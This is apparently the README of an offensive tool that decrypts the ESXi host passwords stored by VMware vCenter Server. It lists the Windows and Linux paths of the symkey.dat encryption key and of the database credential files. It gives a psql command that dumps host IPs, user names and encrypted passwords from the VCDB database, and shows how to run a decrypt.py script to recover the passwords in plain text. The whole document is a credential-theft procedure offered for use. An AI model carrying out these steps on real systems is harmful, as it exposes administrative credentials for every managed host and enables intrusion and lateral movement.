# vhost_password_decrypt

## Where is symkey.dat
Windows：C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\ssl\symkey.dat

Linux：/etc/vmware-vpx/ssl/symkey.dat

## Where is postgres user password
Windows: C:\ProgramData\VMware\vCenterServer\cfg\vmware-vps\vcdb.properties

Linux：
/etc/vmware-vpx/vcdb.properties
/etc/vmware/service-state/vpxd/vcdb.properties

## Where is psql
Windows: C:\Program Files\VMware\vCenter Server\vPostgres\bin\psql.exe

Linux: /opt/vmware/vpostgres/9.3/bin/psql

## export 
psql -h 127.0.0.1 -p 5432 -U vc -d VCDB -c "select ip_address,user_name,password from vpx_host;" > password.enc

## How to use

pip3 install pycryptodome

python3 decrypt.py symkey.dat password.enc password.txt

![image](https://user-images.githubusercontent.com/24275308/145789863-3911ce8b-b6e1-4114-b051-1cb0c4df5068.png)
